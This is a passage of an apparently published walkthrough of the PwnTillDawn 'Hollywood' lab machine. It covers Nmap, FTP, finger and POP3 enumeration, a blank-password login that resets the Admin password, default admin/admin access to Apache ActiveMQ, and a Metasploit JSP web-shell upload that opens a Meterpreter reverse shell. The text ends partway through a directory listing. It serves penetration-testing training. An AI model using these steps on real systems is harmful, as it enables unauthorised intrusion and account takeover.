+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2022-12-06T04:02:19+08:00
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4262.54 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="enumeration">Enumeration</h2>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>Let&rsquo;s see the <strong>FTP server</strong> hosted on the victim&rsquo;s machine, We can see that it is <strong>FileZilla service</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp 10.150.150.219 
+</span></span><span class="line"><span class="cl">Connected to 10.150.150.219.
+</span></span><span class="line"><span class="cl">220-FileZilla Server version 0.9.41 beta
+</span></span><span class="line"><span class="cl">220-written by Tim Kosse <span class="o">(</span>Tim.Kosse@gmx.de<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">220</span> Please visit http://sourceforge.net/projects/filezilla/
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.150.150.219:pyke<span class="o">)</span>:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Maybe we can find some exploits related to its <strong>version</strong>!</p>
+<p>I have found an exploit related to this <strong>FileZilla</strong> version at this <a class="link" href="https://github.com/NeoTheCapt/FilezillaExploit"  target="_blank" rel="noopener"
+    >github</a> repository, We can see it at the exploiation phase after we do all our enumerations.</p>
+<h3 id="smtp-enumeration">SMTP Enumeration</h3>
+<p>We can see from the <strong>Nmap scanner</strong> report that the <strong>SMTP</strong> server is <strong>Mercury</strong>, After some <strong>googling</strong> i didn&rsquo;t find any exploits except <strong>DoS</strong> attacks which i don&rsquo;t think it is our objective.</p>
+<p>Also, I have ran an <strong>Nmap script</strong> to know the commands that i can run in the <strong>SMTP</strong> server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p25 --script smtp-commands 10.150.150.219
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-05 11:49 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:03 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.150.150.219
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.099s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">25/tcp open  smtp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: localhost Hello nmap.scanme.org<span class="p">;</span> ESMTPs are:, TIME
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.22 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="finger-enumeration">Finger Enumeration</h3>
+<p>I have found that there is a port associated with a service called <strong>finger</strong>, which it is my first time seeing it.</p>
+<p>The <strong>Name/Finger Protocol (FINGER)</strong> is an application-level Internet protocol that provides an interface between the finger command and the fingerd daemon. 
+The fingerd daemon returns information about the users currently logged in to a specified remote host.</p>
+<p>Okay, Let&rsquo;s see if we can get anything out of it.</p>
+<h4 id="banner-grabbingbasic-connection">Banner Grabbing/Basic connection</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -vn 10.150.150.219 79
+</span></span><span class="line"><span class="cl">(UNKNOWN) [10.150.150.219] 79 (finger) open
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Login: Admin         Name: Mail System Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, We know that there is a user called <strong>Admin</strong> and he is the <strong>Mail System Administrator</strong>.</p>
+<h3 id="pop3-enumeration">POP3 Enumeration</h3>
+<p>So, There are two ports associated with <strong>POP</strong> services, Let&rsquo;s if we can get benefit from them.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">106/tcp   open  pop3pw       Mercury/32 poppass service
+</span></span><span class="line"><span class="cl">110/tcp   open  pop3         Mercury/32 pop3d
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: USER EXPIRE<span class="o">(</span>NEVER<span class="o">)</span> APOP TOP UIDL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="106-port">106 Port</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nv 10.150.150.219 <span class="m">106</span>                                                                         
+</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.219<span class="o">]</span> <span class="m">106</span> <span class="o">(</span>poppassd<span class="o">)</span> open
+</span></span><span class="line"><span class="cl"><span class="m">200</span> localhost MercuryW PopPass server ready.
+</span></span><span class="line"><span class="cl"><span class="nb">help</span>
+</span></span><span class="line"><span class="cl">100-Mercury PopPass Server v4.62
+</span></span><span class="line"><span class="cl">100-This server recognizes the following commands:
+</span></span><span class="line"><span class="cl">100-   USER     Enter your user <span class="o">(</span>login<span class="o">)</span> name
+</span></span><span class="line"><span class="cl">100-   PASS     Enter the password matching your username
+</span></span><span class="line"><span class="cl">100-   NEWPASS  Change your password on this system.
+</span></span><span class="line"><span class="cl">100-   QUIT     Logout and close the connection.
+</span></span><span class="line"><span class="cl"><span class="m">100</span> You must login using USER/PASS before attempting NEWPASS.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, I have got an idea whis is to login with user <code>Admin</code> and password as blank, Let&rsquo;s see!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">USER Admin
+</span></span><span class="line"><span class="cl"><span class="m">300</span> Send current password using PASS command:
+</span></span><span class="line"><span class="cl">PASS 
+</span></span><span class="line"><span class="cl"><span class="m">200</span> OK, <span class="s1">&#39;Admin&#39;</span> logged in.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Wow, It worked!</p>
+<p>Now, Let&rsquo;s get a new password for the user <code>Admin</code>!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">NEWPASS <span class="nb">test</span>
+</span></span><span class="line"><span class="cl"><span class="m">200</span> OK, password changed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, So we have a user <code>Admin</code> and password <code>test</code>, Let&rsquo;s get to the other <strong>POP</strong> service!</p>
+<h4 id="110-port">110 Port</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nv 10.150.150.219 <span class="m">110</span>                                                                         
+</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.219<span class="o">]</span> <span class="m">110</span> <span class="o">(</span>pop3<span class="o">)</span> open
+</span></span><span class="line"><span class="cl">+OK &lt;12787729.18997@localhost&gt;, POP3 server ready.
+</span></span><span class="line"><span class="cl">HELP 
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">Mercury/32 MTS Post Office Protocol v3 server v4.62,
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2008 David Harris.
+</span></span><span class="line"><span class="cl">This server recognizes the following commands:
+</span></span><span class="line"><span class="cl">  USER - login as a user
+</span></span><span class="line"><span class="cl">  PASS - specify a password
+</span></span><span class="line"><span class="cl">  APOP - perform secure login
+</span></span><span class="line"><span class="cl">  CAPA - RFC2449 capability discovery
+</span></span><span class="line"><span class="cl">  STLS - Start TLS negotiation, <span class="k">if</span> enabled
+</span></span><span class="line"><span class="cl">  STAT - show mailbox statistics
+</span></span><span class="line"><span class="cl">  RETR - send a message
+</span></span><span class="line"><span class="cl">  LIST - show message numbers and sizes
+</span></span><span class="line"><span class="cl">  DELE - delete a message
+</span></span><span class="line"><span class="cl">  RSET - <span class="s1">&#39;undo&#39;</span> all mailbox changes
+</span></span><span class="line"><span class="cl">  TOP  - show lines from a message
+</span></span><span class="line"><span class="cl">  QUIT - close the connection
+</span></span><span class="line"><span class="cl">  NOOP, RPOP, LAST are also supported.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extended commands:
+</span></span><span class="line"><span class="cl">  XTND XMIT  - Send a message via POP3
+</span></span><span class="line"><span class="cl">  XTND XLST  - Eudora extended list <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">  UIDL - <span class="k">return</span> unique identifier <span class="o">(</span>RFC1725<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s login with our credientials!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">USER Admin
+</span></span><span class="line"><span class="cl">+OK Admin is known here.
+</span></span><span class="line"><span class="cl">PASS <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">+OK Welcome! <span class="m">0</span> messages <span class="o">(</span><span class="m">0</span> bytes<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I think this is a <strong>Rabbit hole</strong> and nothing is important in those ports.</p>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<h4 id="80-port">80 Port</h4>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/1.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http"
+	
+	
+></p>
+<p>It is the home page of <strong>XAMPP</strong> server that host the website for Windows machines.</p>
+<p>If we have got into any directory that doesn&rsquo;t exist and we viewed the <strong>source page</strong>, We will see the first <strong>flag</strong> in it.</p>
+<p><em>FLAG30</em>
+<img src="/post/Hollywood_PwnTillDawn/imgs/7.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http"
+	
+	
+></p>
+<p>Nothing else is here that is important!</p>
+<h4 id="2224-port">2224 Port</h4>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/2.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http2"
+	
+	
+></p>
+<p>It looks like this <strong>HTTP service</strong> is hosting the <strong>Mercury SMTP</strong> mailing management services.</p>
+<p>When we click on the link shown above it redirect us to a form that manage the mailing subscription services.</p>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/3.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http2_2"
+	
+	
+></p>
+<p>I think nothing else is valuable here!</p>
+<h4 id="8080-port">8080 Port</h4>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/4.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http3"
+	
+	
+></p>
+<p>At this <strong>HTTP</strong> port there is a an <strong>Apache Tomcat</strong> server is hosted but in order to go to the <strong>Manager App</strong> we need credientials.</p>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/5.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http3_2"
+	
+	
+></p>
+<h4 id="8161-port">8161 Port</h4>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/6.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http4"
+	
+	
+></p>
+<p>In this <strong>HTTP</strong> port there is <strong>Apache ActiveMQ</strong> hosted on it!</p>
+<p>We can do some search for this service and see what we can do with it?</p>
+<p><strong>ActiveMQ</strong> is an open source protocol developed by Apache which functions as an implementation of message-oriented middleware (MOM). Its basic function is to <strong>send messages between different applications</strong>, but includes additional features like STOMP, JMS, and OpenWire.</p>
+<p>If we clicked on the link <strong>Manage ActiveMQ broker</strong> it will pop up a login form for the <strong>admin</strong> access.</p>
+<p>So I have searched for the default credientials for the admin account and they&rsquo;ve said that:</p>
+<p>The default administration user name and password for the Apache ActiveMQ Administration Console is <strong>admin</strong> and <strong>admin</strong> respectively. You should change these default credentials.</p>
+<p>So, I have tried it and it worked!</p>
+<p><em>FLAG33</em>
+<img src="/post/Hollywood_PwnTillDawn/imgs/8.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http4_2"
+	
+	
+></p>
+<p>Now, We have to get a <strong>Reverse shell</strong> in order to get the last flag from the system.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Let&rsquo;s search if there are any exploits for <strong>Apache ActiveMQ</strong>!</p>
+<p>I came across an exploit from the <a class="link" href="https://www.rapid7.com/db/modules/exploit/multi/http/apache_activemq_upload_jsp/"  target="_blank" rel="noopener"
+    >Rapid7</a> and we will use <strong>Metasploit</strong> ofcourse in order to this exploit which will be a <strong>Web Shell</strong> upload.</p>
+<p>Let&rsquo;s make our way to get the <strong>RevShell</strong>!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/http/apache_activemq_upload_jsp
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to java/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; show targets
+</span></span><span class="line"><span class="cl">Exploit targets:
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Java Universal
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   Linux
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   Windows
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; <span class="nb">set</span> target <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="nv">target</span> <span class="o">=</span>&gt; <span class="m">2</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/http/apache_activemq_upload_jsp<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name           Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----           ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   AutoCleanup    <span class="nb">true</span>             no        Remove web shells after callback is received
+</span></span><span class="line"><span class="cl">   BasicAuthPass  admin            yes       The password <span class="k">for</span> the specified username
+</span></span><span class="line"><span class="cl">   BasicAuthUser  admin            yes       The username to authenticate as
+</span></span><span class="line"><span class="cl">   JSP                             no        JSP name to use, excluding the .jsp extension <span class="o">(</span>default: random<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Proxies                         no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   RHOSTS                          yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span class="line"><span class="cl">   RPORT          <span class="m">8161</span>             yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SSL            <span class="nb">false</span>            no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
+</span></span><span class="line"><span class="cl">   VHOST                           no        HTTP server virtual host
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>java/meterpreter/reverse_tcp<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   LHOST  192.168.152.128  yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   Windows
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.150.150.219
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.150.150.219
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 10.66.X.X
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/apache_activemq_upload_jsp<span class="o">)</span> &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Boom! We got the <strong>Meterpreter</strong> Shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading http://10.150.150.219:8161/C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\a</span>pache-activemq-5.11.1-bin<span class="se">\a</span>pache-activemq-5.11.1<span class="se">\b</span>in<span class="se">\.</span>./webapps/api//pKFhVUPzZsgES.jar
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading http://10.150.150.219:8161/C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\a</span>pache-activemq-5.11.1-bin<span class="se">\a</span>pache-activemq-5.11.1<span class="se">\b</span>in<span class="se">\.</span>./webapps/api//pKFhVUPzZsgES.jsp
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175686</span> bytes<span class="o">)</span> to 10.150.150.219
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleted C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\a</span>pache-activemq-5.11.1-bin<span class="se">\a</span>pache-activemq-5.11.1<span class="se">\b</span>in<span class="se">\.</span>./webapps/api//pKFhVUPzZsgES.jsp
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.66.X.X:4444 -&gt; 10.150.150.219:49309<span class="o">)</span> at 2022-12-05 15:46:27 -0500
+</span></span><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">Server username: HOLLYWOOD<span class="se">\U</span>ser
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, Let&rsquo;s switch up to the <strong>CMD shell</strong> and navigate to get our last flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="p">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="k">Process</span> <span class="n">4696</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="n">2</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="no">[Version 6.1.7601]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">2009</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">apache-activemq</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">1-bin</span><span class="p">\</span><span class="nb">apache-activemq</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">1</span><span class="p">\</span><span class="n">bin</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">021A</span><span class="p">-</span><span class="n">9C32</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">apache-activemq</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">1-bin</span><span class="p">\</span><span class="nb">apache-activemq</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">1</span><span class="p">\</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">11</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2018</span>  <span class="n">05</span><span class="err">:</span><span class="n">06</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">11</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2018</span>  <span class="n">05</span><span class="err">:</span><span class="n">06</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">11</span><span class="err">:</span><span class="n">05</span> <span class="n">AM</span>            <span class="n">19</span><span class="p">,</span><span class="n">091</span> <span class="n">activemq</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">11</span><span class="err">:</span><span class="n">05</span> <span class="n">AM</span>             <span class="n">5</span><span class="p">,</span><span class="n">665</span> <span class="nb">activemq-admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">11</span><span class="err">:</span><span class="n">05</span> <span class="n">AM</span>             <span class="n">4</span><span class="p">,</span><span class="n">211</span> <span class="nb">activemq-admin</span><span class="p">.</span><span class="n">bat</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">11</span><span class="err">:</span><span class="n">05</span> <span class="n">AM</span>             <span class="n">4</span><span class="p">,</span><span class="n">211</span> <span class="n">activemq</span><span class="p">.</span><span class="n">bat</span>
